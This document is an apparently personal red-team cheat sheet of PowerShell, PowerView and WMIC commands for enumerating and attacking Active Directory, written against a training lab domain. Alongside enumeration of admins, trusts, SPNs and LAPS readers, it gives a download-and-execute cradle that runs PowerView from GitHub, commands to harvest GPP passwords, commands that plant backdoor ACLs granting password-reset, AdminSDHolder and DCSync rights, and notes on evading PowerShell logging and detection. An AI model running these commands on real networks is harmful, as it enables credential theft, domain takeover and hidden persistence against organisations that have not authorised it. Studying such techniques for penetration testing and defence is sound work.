# Unauthorized env.
# Two main tools to use: PowerView && AD PowerShell module. 

# PowerView Repos.
Master Branch: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Dev Branch: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

# AD PowerShell module should be installed after initial compromise. 
Import-Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell 

# DNS using LDAP.
## Identify machines inside the domain or do reverse lookups using LDAP.
get-adcomputer -filter * -Properties ipv4address | where {$_.IPV4address} | select name, ipv4address

## or.
get-adcomputer -filter {ipv4address -eq 'IP'} -Properties Lastlogondate, passwordlastset, ipv4address

# SPN scanning.
## uses LDAP queries to look for Service Principal Names. uses signposts that are used to identify services on server that support kerberos. No port scanning involved. 
Find-PSServiceAccounts

## manually perform SPN scanning. 
get-adcomputer -filter {ServicePrincipalName -Like "*SPN*" } -Properties OperatingSystem, OperatingSystemVersion, OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

# Group Policy Enumerations.
## To discover all group policies inside a domain
Get-NetGPO | select displayname,name,whenchanged

# PowerView to enumerate (Unauthenticated User) 
## Enumerate Domain Admins.
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetGroupMember 'Domain Admins'"
## Or
Get-NetGroupMember 'Domain Admins' -Recurse

## Request for all members of Domain Admins and tokenize every display name to re-query for all users that match that pattern. 
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split(' ')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname

# User hunting.
## Invoke-UserHunter has an option called stealth.
Invoke-UserHunter -Stealth -ShowAll 	# Without -Stealth Option is not safe. 
Invoke-StealthUserHunter -ShowAll

## Get all users of a forest. No Administrator privilege needed. 
Get-ForestGlobalCatalog

## Script to connect to Global Catalog and setup searcher for the entire forest. Get the RootDomain GC from the output of Get-ForestGlobalCatalog.
[ADSI] $RootDSE = "LDAP://RootDSE"
[Object] $RootDomain = New-Object System.DirectoryServices.DirectoryEntry "GC://lab-dc02.els-child.eLS.local"
[Object] $Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = $RootDomain
$Searcher.PageSize = 1000

# Local Administrator Enumeration
## Must be Authenticated User. 
## Retrieve members of the "Administrators" localgroup on a specific remote machine using WinNT service. 
([ADSI]'WinNT://$remote_computer_name/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}

## Retrieve using Get-NetLocalGroup 
Get-NetLocalGroup -ComputerName $computer_name 

## Retrieve localgroup membership with NetLocalGroupGetMembers API call. 
Get-NetLocalGroup -ComputerName $computer_name -API

## Get the list of effective users who can access a target system. 
Get-NetLocalGroup -ComputerName $computer_name -Recurse 

## Identify Administrator Accounts: Group Enumeration
Get-NetGroupMember -GroupName "Domain Admins" 

## Identify Administrator Accounts: RODC Groups (indirectly)
Get-NetGroupMember -GroupName "Denied RODC Password Replication Group" -Recurse

## Identify Administrator Accounts: AdminCount = 1
Get-NetUser -AdminCount | select name,whencreated,pwdlastset,lastlogon 	# Might have false positive. 

## Identify Administrator Accounts: GPO Enumeration & Abuse. 
Find-GPOLocation -UserName $username
Find-GPOLocation -UserName $username -LocalGroup RDP

### Find users/groups who can administer a given machine through GPO enumeration.
Find-GPOComputerAdmin -ComputerName $computer_name

## Identify Administrator Accounts: GPPs (\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\)
## Use PowerSploit's get-GPPPassword to identify administrator credentials in SYSVOL. 
https://github.com/PowerShellMafia/PowerSploit
Get-GPPPassword 

## Identify Active Directory Groups with Local Admin rights.
Get-NetGPOGroup
Get-NetGroupMember -GroupName "Local Admin" 	# Check Get-NetGPOGroup for Local Admin name first.
### Alternatively:
Get-NetOU
Find-GPOComputerAdmin -OUName 'OU=X,OU=Y,DC=Z,DC=W'
Get-NetComputer -ADSpath 'OU=X,OU=Y,DC=Z,DC=W'

## Identify regular users having admin rights. 
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse | ?{Get-NetUser $_.MemberName -filter '(mail=*)'}
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse | ?{$_.MemberName -Like '*.*'} 

## Identify virtual admins 
Get-NetGroup "*Hyper*" | Get-NetGroupMember 
Get-NetGroup "*VMWare*" | Get-NetGroupMember

## Identify Computers with Admin Rights.
## If we find computer accounts with a dollar sign at the end in an admin group, all we have to do is compromise that computer account and get SYSTEM on it. 
## Use Powerview. 
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse |?{$_.MemberName -Like '*$'} 

# Interesting Group Enumeration
## Finding Remote Desktop Users. 
Get-NetLocalGroup -ComputerName $computer_name -ListGroups
Get-NetLocalGroup -ComputerName $computer_name -Recurse -List

## Determine the actual users having RDP rights.
Get-NetLocalGroup -ComputerName $computer_name -GroupName "Remote Desktop Users" -Recurse

## Identify groups/users that have local administrative access on Domain Controller. 
Get-NetDomainController | Get-NetLocalGroup -Recurse

# Follow the Delegation
## Identify what delegation has been configured on OUs in the domain. 
Invoke-ACLScanner -ResolveGUIDs -ADSpath 'OU=X,OU=Y,DC=Z,DC=W' | Where {$_.ActiveDirectoryRights -eq 'GenericAll'} 
Get-NetGroupMember "Help Desk Level 3" 	# Help Desk Level 3 is a group enumerated from ACLScanner. Look at IdentityReference from result.

## LAPS Delegation
## Identify who has rights to the LAPS password attribute where clear text passwords are stored (ms-Mcs-AdmPwd)
## Find user/groups that have read access to the LAPS password property for a specific computer.
Get-NetComputer -ComputerName '$computer_name' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { Convert-NameToSid $_.IdentityReference } | Select-Object -ExpandProperty SID | Get-ADObject 

## Use PowerView to get ACLs for all OU where someone is allowed to read LAPS password attribute.
Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }

# Gather critical information about the Active Directory and its components.

# AD Forest information
Get-NetForest

# AD Domain information
Get-NetDomain

# Find which Domain Controller hold the PDC emulator FSMO role in the forest. 
Get-ADForest | Select-Object -ExpandProperty RootDomain | Get-ADDomain | Select-Object -Property PDCEmulator

# Domain Trust
# SID history Attack
# If in a forest, a user in a child domain, all the way at the bottom, is set to be "Enterprise Admins", he will have access to every single machine. 

## Enumerate all domains in the current forest.
Get-NetForestDomain

## Enumerate all current domain trusts.
Get-NetUser -Domain $domain_name

## Find admin groups across a trust. 
Get-NetGroup *admin* -Domain $domain_name 

## Map all reachable domain trusts.
Invoke-MapDomainTrust

## Map all reachable domain trusts through LDAP queries, reflected through the current PDC.
Invoke-MapDomainTrust -LDAP

## Export Domain trust mappings for visualization.
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv

## Find users in current domain that reside in groups across a trust. 
Find-ForeignUser

## Find groups in a remote domain that include users not in the target domain.
Find-ForeignUser -Domain $domain_name

## Get trust-related information.
Get-NetDomainTrust 	# misconfiguration in trust can result in domain/forest compromise. 

# Identifying Partner Organizations using Contacts. 
## Identify partner organizations and associated contacts.
get-ADObject -Filter {ObjectClass -eq "Contacts"} -Prop *

# Enumerate AD ACLs for a given user.
Get-ObjectACL -ResolveGUIDs -SamAccountName $SamAccountName

# Add a backdoored ACL, grant 'SamAccountName1' the right to reset password for 'SamAccountName2'. 
Add-ObjectACL -TargetSamAccountName $SamAccountName2 -PrincipalSamAccountName $SamAccountName1 -Rights ResetPassword

# Add a backdoor for the permissions for AdminSDHolder
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $SamAccountName1 -Version -Rights All

# Audit ACL rights for AdminSDHolder
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'} 

# Add a backdoor for the rights for DCSync. Grants 'SamAccountName1' the right to replicate any hash for the DC.
# SamAccountName1 can be an unprivileged user.
Add-ObjectACL -TargetDistinguishedName "dc=els,dc=local" -PrincipalSamAccountName $SamAccountName1 -Rights DCSync

# Audit users who have DCSync rights.
Get-ObjectACL -DistinguishedName "dc=els,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }

# Audit GPO permissions
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty'}

# To scan for "non-standard" ACL permission sets.
Invoke-ACLScanner

# Check for passwords stored in description, extension fields. 
# Look for confidential field, bitlocker and LAPS passwords are stored there. 
Get-ADUser $username -Properties * | Select Description

# Look at user properties like LastLogonDate, PasswordLastSet, AdminCount
# If AdminCount=1, that user account most likely is a member of the "Domain Admins" or
# another privileged group. This is because there is a process that runs every 60 seconds to 
# protect privileged groups in AD that stamps them with AdminCount=1. 

# Look at SID history, it can contain SID from another user and provide the same level of 
# access as that user. It is effectively permission cloning. 
# If there is such situation, target that user. 

# Search based on AdminCount or Service Principal Name properties via LDAP
Get-NetUser -AdminCount 
Get-NetUser -SPN

# Get AD computer properties. This is a good way to identify computers without scanning.
Get-ADComputer -Filter * -Property property

# Get Domain Controller by looking at PrimaryGroupID 516.
Get-ADComputer -Filter * -Property PrimaryGroupID 	#look for 516. 

# Find computers featuring a specific OS.
Get-ADComputer -Filter 'OperatingSystemVersion -eq "6.3 (9600)"' 

# Find all MSSQL Servers by using SPN property. 
Get-NetComputer -SPN mssql*

# LastLogonDate -> relates to when a computer last reboot. 
# Next, look at PasswordLastSet to see if they are still active on the network. 
# If the PasswordLastSet is more than 60 days, the computer may not be on the network. 
# If the LastLogonDate is more than 6 months, the computer might not been patched. 

# Check for kerberos enterprise services.
Get-ADComputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

# When object in AD is deleted, it is not deleted but hidden. 
# Check for isdeleted flag, pull them out and look.
# This operation requires local administrator privileges. 
Import-Module .\DisplayDeletedADObjects.psm1
Get-OSCDeletedADObjects

# Get domain password policies
# If the password length is 7, write it as a finding. 
Get-ADDefaultDomainPasswordPolicy

# PowerShell is heavily monitored.
# Might be better to use these tools
#
# pywerview - https://github.com/the-useless-one/pywerview
# windapsearch - https://github.com/ropnop/windapsearch
# hunter - NOT FOUND

# Identify internal websites or applications.
# Get-BrowserData.ps1 - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
# SessionGopher to identify systems that may connect to Unix Systems, Jump boxes, Point of sale terminal
# SessionGopher.ps1 - https://github.com/Arvanaghi/SessionGopher

# Evasion - Parent PID Spoofing
# https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/
# Use evasion techniques asap to aviod detection. 

# Check for available PowerShell engine.
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowershellEngine /v PowershellVersion
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowershellEngine /v PowershellVersion
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion

# Check for Powershell Logging. 
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

# Information gathering using WMI
## Find Anti Virus
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe

## List updates
wmic qfe list brief

## Search files containing 'password' in the name
wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE 

## Get local user accounts
wmic useraccount list

## Get Domain DC and information
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles

## List all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname

## Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname

## Get members of domain admins group
wmic path win32_groupuser where (groupcomponent="win32.group.name='domain admins',domain='$YOUR_DOMAIN'")

## List all computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname


